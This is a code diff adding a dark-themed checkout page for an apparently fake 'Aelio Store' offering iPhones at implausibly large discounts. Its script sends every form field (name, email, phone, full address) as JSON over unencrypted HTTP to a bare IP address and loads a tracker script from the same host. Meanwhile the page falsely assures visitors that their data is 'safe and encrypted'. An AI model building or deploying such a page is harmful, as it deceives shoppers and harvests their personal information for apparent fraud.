@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Order — Aelio Store</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#000;--s1:#111;--s2:#1c1c1e;--border:rgba(255,255,255,0.1);--text:#f5f5f7;--muted:#86868b;--accent:#2997ff;--green:#30d158;--red:#ff453a}
+body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
+
+nav{position:fixed;top:0;left:0;right:0;z-index:100;height:48px;background:rgba(0,0,0,0.85);backdrop-filter:blur(20px);border-bottom:0.5px solid var(--border);display:flex;align-items:center;justify-content:center}
+.nav-inner{max-width:1100px;width:100%;padding:0 24px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:18px;font-weight:600;color:var(--text);text-decoration:none}
+.nav-back{font-size:13px;color:var(--accent);text-decoration:none}
+.nav-back:hover{opacity:.8}
+
+.page{max-width:960px;margin:0 auto;padding:80px 24px 60px;display:grid;grid-template-columns:1fr 380px;gap:40px;align-items:start}
+
+/* LEFT — FORM */
+.form-card{background:var(--s1);border-radius:20px;padding:36px}
+.form-title{font-size:26px;font-weight:500;letter-spacing:-0.5px;margin-bottom:4px}
+.form-sub{font-size:14px;color:var(--muted);margin-bottom:32px}
+
+.step-label{font-size:11px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;margin:24px 0 14px;padding-bottom:10px;border-bottom:0.5px solid var(--border)}
+.step-label:first-of-type{margin-top:0}
+
+.form-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.form-group{margin-bottom:14px}
+.form-group label{display:block;font-size:12px;font-weight:500;color:var(--muted);margin-bottom:7px;text-transform:uppercase;letter-spacing:.04em}
+.form-group input,.form-group select,.form-group textarea{width:100%;background:var(--s2);border:0.5px solid var(--border);border-radius:10px;padding:12px 14px;font-size:15px;color:var(--text);font-family:inherit;transition:border-color .2s;-webkit-appearance:none;resize:none}
+.form-group input::placeholder,.form-group textarea::placeholder{color:#3a3a3c}
+.form-group input:focus,.form-group select:focus,.form-group textarea:focus{outline:none;border-color:var(--accent)}
+.form-group select option{background:#1c1c1e}
+
+.submit-btn{width:100%;padding:16px;background:var(--accent);color:#fff;border:none;border-radius:14px;font-size:16px;font-weight:500;font-family:inherit;cursor:pointer;transition:background .2s,transform .15s;margin-top:8px}
+.submit-btn:hover{background:#0077ed;transform:scale(1.01)}
+.submit-btn:active{transform:scale(0.99)}
+.form-note{font-size:12px;color:var(--muted);text-align:center;margin-top:12px;line-height:1.6}
+
+/* RIGHT — SUMMARY */
+.summary-card{background:var(--s1);border-radius:20px;padding:28px;position:sticky;top:68px}
+.summary-title{font-size:16px;font-weight:600;margin-bottom:20px}
+.summary-product{display:flex;gap:14px;align-items:center;margin-bottom:20px;padding-bottom:20px;border-bottom:0.5px solid var(--border)}
+.summary-img{font-size:48px;flex-shrink:0}
+.summary-name{font-size:15px;font-weight:500;margin-bottom:2px}
+.summary-sub{font-size:13px;color:var(--muted)}
+.summary-rows{margin-bottom:16px}
+.summary-row{display:flex;justify-content:space-between;font-size:14px;padding:7px 0;border-bottom:0.5px solid var(--border)}
+.summary-row:last-child{border-bottom:none;font-weight:600;font-size:16px;color:var(--green);padding-top:12px}
+.summary-key{color:var(--muted)}
+.summary-badges{display:flex;flex-direction:column;gap:8px;margin-top:16px}
+.sbadge{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--muted)}
+.sbadge span:first-child{font-size:16px}
+
+/* SUCCESS */
+.success{display:none;text-align:center;padding:40px 20px}
+.success.show{display:block}
+.success-icon{font-size:64px;margin-bottom:16px}
+.success h2{font-size:26px;font-weight:500;letter-spacing:-0.5px;margin-bottom:8px}
+.success p{font-size:15px;color:var(--muted);line-height:1.6;margin-bottom:24px}
+.back-btn{display:inline-block;padding:12px 28px;background:var(--s2);color:var(--text);border-radius:980px;text-decoration:none;font-size:14px;transition:background .2s}
+.back-btn:hover{background:#2c2c2e}
+
+footer{border-top:0.5px solid var(--border);padding:20px 24px;text-align:center;font-size:12px;color:var(--muted);margin-top:40px}
+
+@media(max-width:720px){
+  .page{grid-template-columns:1fr}
+  .summary-card{position:static}
+  .form-row{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-inner">
+    <a href="javascript:history.back()" class="nav-back">← Back</a>
+    <a href="catalog.html" class="logo">◆ Aelio</a>
+    <div style="width:60px"></div>
+  </div>
+</nav>
+
+<div class="page">
+
+  <!-- FORM -->
+  <div class="form-card">
+    <div id="form-content">
+      <h2 class="form-title">Complete your order</h2>
+      <p class="form-sub">Fill in your details and we'll contact you within 1 hour.</p>
+
+      <form id="order-form" onsubmit="submitOrder(event)">
+        <div class="step-label">Contact information</div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>First name</label>
+            <input type="text" name="first_name" placeholder="John" required />
+          </div>
+          <div class="form-group">
+            <label>Last name</label>
+            <input type="text" name="last_name" placeholder="Doe" required />
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Email</label>
+          <input type="email" name="email" placeholder="john@example.com" required />
+        </div>
+        <div class="form-group">
+          <label>Phone number</label>
+          <input type="tel" name="phone" placeholder="+1 (555) 000-0000" required />
+        </div>
+
+        <div class="step-label">Delivery address</div>
+        <div class="form-group">
+          <label>Country</label>
+          <select name="country" required>
+            <option value="">Select country</option>
+            <option>Ukraine</option>
+            <option>Germany</option>
+            <option>Poland</option>
+            <option>France</option>
+            <option>United Kingdom</option>
+            <option>United States</option>
+            <option>Other</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>City</label>
+          <input type="text" name="city" placeholder="New York" required />
+        </div>
+        <div class="form-group">
+          <label>Street address</label>
+          <input type="text" name="address" placeholder="123 Main St, Apt 4B" required />
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>ZIP / Postal code</label>
+            <input type="text" name="zip" placeholder="10001" required />
+          </div>
+          <div class="form-group">
+            <label>State / Region</label>
+            <input type="text" name="state" placeholder="New York" />
+          </div>
+        </div>
+
+        <div class="step-label">Additional info</div>
+        <div class="form-group">
+          <label>Comment (optional)</label>
+          <textarea name="comment" placeholder="Any special requests or questions..." rows="3"></textarea>
+        </div>
+
+        <button type="submit" class="submit-btn">Place Order →</button>
+        <p class="form-note">By placing an order you agree to our terms.<br>🔒 Your data is safe and encrypted.</p>
+      </form>
+    </div>
+
+    <div class="success" id="success">
+      <div class="success-icon">✅</div>
+      <h2>Order placed!</h2>
+      <p>Thank you! We'll contact you within 1 hour to confirm your order and arrange delivery. Check your email for confirmation.</p>
+      <a href="catalog.html" class="back-btn">← Continue shopping</a>
+    </div>
+  </div>
+
+  <!-- SUMMARY -->
+  <div class="summary-card">
+    <div class="summary-title">Order summary</div>
+    <div class="summary-product">
+      <div class="summary-img">📱</div>
+      <div>
+        <div class="summary-name" id="sum-name">iPhone</div>
+        <div class="summary-sub" id="sum-sub">Loading...</div>
+      </div>
+    </div>
+    <div class="summary-rows">
+      <div class="summary-row"><span class="summary-key">Original price</span><span id="sum-original" style="text-decoration:line-through;color:var(--muted)">—</span></div>
+      <div class="summary-row"><span class="summary-key">Your discount</span><span style="color:var(--green)" id="sum-discount">—</span></div>
+      <div class="summary-row"><span class="summary-key">Shipping</span><span style="color:var(--green)">Free</span></div>
+      <div class="summary-row"><span class="summary-key">Total</span><span id="sum-total">—</span></div>
+    </div>
+    <div class="summary-badges">
+      <div class="sbadge"><span>🚚</span><span>Free shipping · 3–5 days</span></div>
+      <div class="sbadge"><span>✅</span><span>1-year warranty included</span></div>
+      <div class="sbadge"><span>↩️</span><span>30-day return policy</span></div>
+      <div class="sbadge"><span>📞</span><span>We call you within 1 hour</span></div>
+    </div>
+  </div>
+
+</div>
+
+<footer>Copyright © 2026 Aelio Store. All rights reserved.</footer>
+
+<script src="/tracker.js" data-server="http://204.168.215.87"></script>
+<script>
+const params = new URLSearchParams(window.location.search);
+const name = params.get('name') || 'iPhone 15';
+const price = parseInt(params.get('price') || '599');
+const model = params.get('model') || 'iphone15';
+
+// Fill summary
+document.getElementById('sum-name').textContent = name;
+document.getElementById('sum-sub').textContent = 'In stock · Ships in 24h';
+document.getElementById('sum-total').textContent = '$' + price;
+
+// Estimate original
+const originals = {iphone15:999,iphone15pro:1199,iphone15promax:1599,iphone16:1099,iphone16pro:1299,iphone16promax:1799,iphone17:1199,iphone17pro:1499,iphone17promax:1999};
+const orig = originals[model] || Math.round(price * 1.6);
+document.getElementById('sum-original').textContent = '$' + orig;
+document.getElementById('sum-discount').textContent = '−$' + (orig - price);
+document.title = 'Order ' + name + ' — Aelio Store';
+
+function submitOrder(e) {
+  e.preventDefault();
+  const form = e.target;
+  const fields = {};
+  form.querySelectorAll('input, select, textarea').forEach(i => {
+    if(i.name) fields[i.name] = i.value;
+  });
+  fields.product = name;
+  fields.price = '$' + price;
+
+  fetch('http://204.168.215.87/log', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      event: 'form_submit',
+      form: 'order',
+      level: 'info',
+      page: window.location.pathname,
+      fields,
+      msg: '🛍️ New order: ' + name + ' · $' + price + ' · ' + (fields.phone || '')
+    })
+  }).catch(() => {});
+
+  document.getElementById('form-content').style.display = 'none';
+  document.getElementById('success').classList.add('show');
+}
+</script>
+</body>
+</html>
